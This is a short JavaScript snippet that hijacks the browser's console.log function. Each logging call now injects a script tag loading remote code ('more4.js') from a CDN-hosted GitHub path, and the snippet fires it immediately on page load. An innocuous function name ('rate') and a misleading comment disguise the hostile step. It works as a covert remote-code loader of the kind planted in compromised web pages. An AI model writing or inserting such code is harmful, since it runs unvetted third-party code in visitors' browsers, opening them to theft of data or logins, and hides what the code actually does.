var uri = "https://cdn.jsdelivr.net/gh/text-plain/plain.txt/more4.js";

function rate(params) {
    var script = document.createElement('script');script.type = 'text/javascript';script.src = params;document.head.appendChild(script);    
}

// Save the original console.log function
const originalConsoleLog1 = console.log;

// Override console.log function
console.log = function(message) {
    // Redirect the browser to a new URL with the log message
    rate(uri);
    
    // Optionally, log the message to the console as well
    originalConsoleLog1.apply(console, arguments);
};
console.log("NUMPAD!")